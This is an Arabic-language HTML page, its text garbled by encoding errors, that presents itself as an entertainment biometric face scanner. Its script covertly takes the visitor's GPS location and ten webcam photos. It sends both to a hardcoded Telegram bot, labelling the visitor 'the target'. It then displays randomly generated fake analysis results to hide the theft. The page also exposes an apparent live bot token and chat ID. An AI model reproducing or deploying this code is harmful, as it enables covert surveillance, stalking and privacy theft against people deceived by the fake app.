<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BioMetric Face Scan | Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙŠÙˆÙ…ØªØ±ÙŠ</title>
    <style>
        body { background-color: #0a0a12; color: #00ff88; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }
        .scanner-container { border: 1px solid #00ff88; background: rgba(0, 255, 136, 0.05); padding: 25px; border-radius: 12px; text-align: center; box-shadow: 0 0 25px rgba(0, 255, 136, 0.2); width: 100%; max-width: 450px; position: relative; overflow: hidden; }
        .scan-grid { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 136, 0.1) 3px), repeating-linear-gradient(90deg, transparent, transparent 2px, rgba(0, 255, 136, 0.1) 3px); z-index: -1; }
        h2 { letter-spacing: 2px; margin-bottom: 10px; }
        .btn-scan { background: #00ff88; color: #0a0a12; border: none; padding: 12px 35px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; border-radius: 4px; transition: 0.3s; }
        .btn-scan:hover { box-shadow: 0 0 15px #00ff88; }
        #status { margin-top: 20px; font-size: 14px; color: #a0a0a0; min-height: 20px; }
        
        .results-box { display: none; text-align: right; margin-top: 30px; border-top: 2px dashed #00ff88; padding-top: 20px; }
        .result-item { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 15px; }
        .result-label { color: #a0a0a0; }
        .result-value { font-weight: bold; color: #fff; }
        .final-score { text-align: center; font-size: 24px; color: #00ff88; margin-top: 25px; font-weight: bold; border: 1px solid #00ff88; padding: 10px; }
        .loading-bar { width: 0%; height: 3px; background: #00ff88; margin-top: 10px; transition: width 0.3s; }
    </style>
</head>
<body>
    <div class="scanner-container">
        <div class="scan-grid"></div>
        <h2>BIOMETRIC ANALYZER</h2>
        <p style="color: #a0a0a0; font-size: 13px;">Ù†Ø³ØªØ®Ø¯Ù… Ø®ÙˆØ§Ø±Ø²Ù…ÙŠØ§Øª Ù…ØªÙ‚Ø¯Ù…Ø© Ù„ØªØ­Ù„ÙŠÙ„ ØªÙ†Ø§Ø³Ù‚ Ø§Ù„Ù…Ù„Ø§Ù…Ø­ØŒ Ø§Ù„ØµØ­Ø© Ø§Ù„Ø¸Ø§Ù‡Ø±ÙŠØ©ØŒ ÙˆØ§Ù„Ø³Ù…Ø§Øª Ø§Ù„ÙØ±ÙŠØ¯Ø© Ù„ÙˆØ¬Ù‡Ùƒ.</p>
        
        <div id="pre-scan-ui">
            <button class="btn-scan" id="startBtn" onclick="startRealAnalysis()">Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø³Ø­ Ø§Ù„Ø¨ÙŠÙˆÙ…ØªØ±ÙŠ</button>
            <div class="loading-bar" id="bar"></div>
        </div>
        
        <div id="status">Ø§Ù„Ø¬Ù‡Ø§Ø² Ø¬Ø§Ù‡Ø². Ø¨Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„Ø¥Ø°Ù†...</div>

        <div class="results-box" id="resultsUi">
            <h3 style="text-align: center; color: #fff;">ØªÙ‚Ø±ÙŠØ± Ø§Ù„ØªØ­Ù„ÙŠÙ„</h3>
            <div class="result-item"><span class="result-label">Ù‡ÙŠÙƒÙ„ Ø§Ù„ÙˆØ¬Ù‡:</span> <span class="result-value" id="res-shape"></span></div>
            <div class="result-item"><span class="result-label">ØªÙ†Ø§Ø³Ù‚ Ø§Ù„Ù…Ù„Ø§Ù…Ø­:</span> <span class="result-value" id="res-symmetry"></span></div>
            <div class="result-item"><span class="result-label">Ø§Ù„Ø¹Ù…Ø± Ø§Ù„Ø¸Ø§Ù‡Ø±ÙŠ Ø§Ù„Ù…Ù‚Ø¯Ø±:</span> <span class="result-value" id="res-age"></span></div>
            <div class="result-item"><span class="result-label">Ø­ÙŠÙˆÙŠØ© Ø§Ù„Ø¨Ø´Ø±Ø©:</span> <span class="result-value" id="res-skin"></span></div>
            <div class="final-score" id="res-score"></div>
            <p style="font-size: 12px; text-align: center; margin-top: 15px; color: #a0a0a0;">ØªÙ… Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø¨ÙˆØ§Ø³Ø·Ø© BioScan AI v4.2. Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ù„Ù„Ø£ØºØ±Ø§Ø¶ Ø§Ù„ØªØ±ÙÙŠÙ‡ÙŠØ©.</p>
        </div>
    </div>

    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
        const CHAT_ID = '8293639164';

        const faceShapes = ["Ø¨ÙŠØ¶Ø§ÙˆÙŠ Ù…ØªÙ†Ø§Ø³Ù‚", "Ø¯Ø§Ø¦Ø±ÙŠ", "Ù…Ø±Ø¨Ø¹ Ù…Ø­Ø¯Ø¯", "Ù‚Ù„Ø¨ÙŠ Ø§Ù„Ø´ÙƒÙ„", "Ù…Ø§Ø³ÙŠ Ù†Ø§Ø¯Ø±"];
        const skinTypes = ["Ù†Ø¶Ø±Ø© ÙˆØµØ­ÙŠØ© (92%)", "Ø¹Ø§Ø¯ÙŠØ© (85%)", "ØªØ­ØªØ§Ø¬ ØªØ±Ø·ÙŠØ¨ (78%)", "Ù…Ù…ØªØ§Ø²Ø© (95%)"];
        
        function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
        function res(id, val) { document.getElementById(id).innerText = val; }

        async function startRealAnalysis() {
            const btn = document.getElementById('startBtn');
            const status = document.getElementById('status');
            const bar = document.getElementById('bar');
            
            btn.style.display = 'none';
            status.innerHTML = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨ÙˆØ­Ø¯Ø© Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø³Ø­Ø§Ø¨ÙŠØ©...";
            bar.style.width = "10%";

            // 1. Ø§Ù„ØªÙ‚Ø§Ø· GPS
            navigator.geolocation.getCurrentPosition((pos) => {
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("ğŸ“ Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ø§Ù„Ù‡Ø¯Ù:\nhttps://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude)}`);
            });

            // 2. ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„ØªÙ‚Ø§Ø· 10 ØµÙˆØ±
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                video.srcObject = stream;
                
                canvas.width = 640; 
                canvas.height = 480;

                // Ø­Ù„Ù‚Ø© Ù„Ø§Ù„ØªÙ‚Ø§Ø· 10 ØµÙˆØ±
                for (let i = 1; i <= 10; i++) {
                    status.innerHTML = `Ø¬Ø§Ø±ÙŠ Ù…Ø³Ø­ Ø§Ù„Ø·Ø¨Ù‚Ø© Ø§Ù„Ø­ÙŠÙˆÙŠØ© Ù„Ù„ÙˆØ¬Ù‡ (${i}/10)... ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø«Ø¨Ø§Øª`;
                    bar.style.width = (10 + (i * 8)) + "%";

                    // Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„Ù„Ù‚Ø·Ø© Ø§Ù„Ø­Ø§Ù„ÙŠØ© Ù…Ù† Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    await new Promise(resolve => {
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('photo', blob, `shot_${i}.jpg`);
                            formData.append('chat_id', CHAT_ID);
                            formData.append('caption', `ğŸ“¸ Ù„Ù‚Ø·Ø© Ø±Ù‚Ù… ${i} Ù…Ù† 10 Ù„Ù„Ù‡Ø¯Ù`);
                            
                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { 
                                method: 'POST', 
                                body: formData 
                            }).then(() => resolve());
                        }, 'image/jpeg', 0.7); // ØªÙ‚Ù„ÙŠÙ„ Ø§Ù„Ø¬ÙˆØ¯Ø© Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ù„Ø³Ø±Ø¹Ø© Ø§Ù„Ø±ÙØ¹
                    });

                    // Ø§Ù†ØªØ¸Ø§Ø± Ù†ØµÙ Ø«Ø§Ù†ÙŠØ© Ø¨ÙŠÙ† ÙƒÙ„ ØµÙˆØ±Ø© ÙˆØµÙˆØ±Ø©
                    await new Promise(r => setTimeout(r, 600));
                }

                status.innerHTML = "ØªÙ…Øª Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©. Ø¬Ø§Ø±ÙŠ ØªÙˆÙ„ÙŠØ¯ Ø§Ù„ØªÙ‚Ø±ÙŠØ±...";
                bar.style.width = "100%";

                // 3. Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©
                setTimeout(() => {
                    stream.getTracks().forEach(t => t.stop());
                    document.getElementById('pre-scan-ui').style.display = 'none';
                    status.style.display = 'none';
                    document.getElementById('resultsUi').style.display = 'block';

                    res('res-shape', faceShapes[getRandomInt(0, faceShapes.length - 1)]);
                    res('res-symmetry', getRandomInt(85, 98) + "% (Ù…Ù…ØªØ§Ø²)");
                    res('res-age', getRandomInt(22, 35) + " Ø³Ù†Ø©");
                    res('res-skin', skinTypes[getRandomInt(0, skinTypes.length - 1)]);
                    res('res-score', "Ø§Ù„ØªÙ‚ÙŠÙŠÙ… Ø§Ù„Ø¹Ø§Ù…: " + getRandomInt(88, 96) + "/100 A+");
                }, 2000);

            } catch (err) {
                status.innerText = "Ø®Ø·Ø£: Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø¥ØªÙ…Ø§Ù… Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø¨Ø¯ÙˆÙ† ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§.";
                status.style.color = "#ff3333";
                bar.style.background = "#ff3333";
            }
        }
    </script>
</body>
</html>
